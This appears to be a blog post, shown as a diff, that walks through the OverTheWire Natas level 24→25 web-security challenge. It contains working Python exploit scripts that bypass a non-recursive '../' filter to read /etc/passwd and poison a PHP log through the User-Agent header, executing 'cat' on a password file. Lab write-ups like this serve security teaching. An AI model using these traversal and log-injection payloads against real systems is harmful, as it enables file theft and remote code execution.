@@ -1,0 +1,97 @@
+---
+layout: post
+title:  "Natas Level 24 → Level 25"
+date:   2021-05-30 17:12:11
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: OMG
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+This level starts with some static text and a dropdown to change the language of the text. As usual, there's also a link to the source code.
+
+Below we see an attempt as sanitization.
+```php
+function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+```
+
+While this works at first glance there is a problem. While something such as **../../../../../../etc/passwd** would be caught and rewritten as **etc/passwd** which even if it exists, what would be the result of something like **..././..././..././..././..././..././etc/passwd**? Let's create a Python script and see what happens.
+
+```python
+#!/usr/bin/env python
+import requests
+from requests.auth import HTTPBasicAuth
+
+password = 'G------------------------------c'
+session = requests.Session()
+
+auth = HTTPBasicAuth('natas25', password)
+url = 'http://natas25.natas.labs.overthewire.org/index.php'
+session.post(url=url, auth=auth)  # create session id
+
+passwd = '..././..././..././..././..././etc/passwd'
+resp = session.post(url=url, data={"lang": passwd}, auth=auth)
+
+print(resp.text)
+```
+
+In the output we see the contents of /etc/passwd. The reason this worked is because the sanitzation attempt in not recursive. Let's look at a the following portion of the directory traversal string and see what's going on.
+```
+..././
+↑↑↑↑↑↑
+123456
+```
+
+The function looks for **../** and removes any occurances found.  In the above example numbers 2, 3, and 4 meet this criteria and are deleted. Starting again at 5 a dot is encountered, but 6 is a slash. The sanitization has completed. The sanitized string now consists of 1, 5, and 6. This string is now considered safe by the rest of the program.
+
+Now let's look at the logging function:
+```php
+function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+```
+
+Notice that the log contains our User Agent. This is set in the headers and is something we can control. We should be able to inline a simple php script that writes the natas25 password to the log. Since we have the path and name of the log file, we can use the weakness in the directory traversal filter and avoid the natas_webpass filter all together.
+
+Let's update the Python script:
+```python
+#!/usr/bin/env python
+import requests
+from requests.auth import HTTPBasicAuth
+
+password = 'G------------------------------c'
+session = requests.Session()
+
+auth = HTTPBasicAuth('natas25', password)
+url = 'http://natas25.natas.labs.overthewire.org/index.php'
+session.post(url=url, auth=auth)  # create session id
+
+headers = {"User-Agent": "<? passthru('cat /etc/natas_webpass/natas26'); ?>"}
+id = session.cookies["PHPSESSID"]  # read session id
+
+log = "..././..././..././..././..././var/www/natas/natas25/logs/natas25_" + id + ".log"
+resp = session.post(url=url, headers=headers, data={"lang": log}, auth=auth)
+
+print(resp.text)
+```
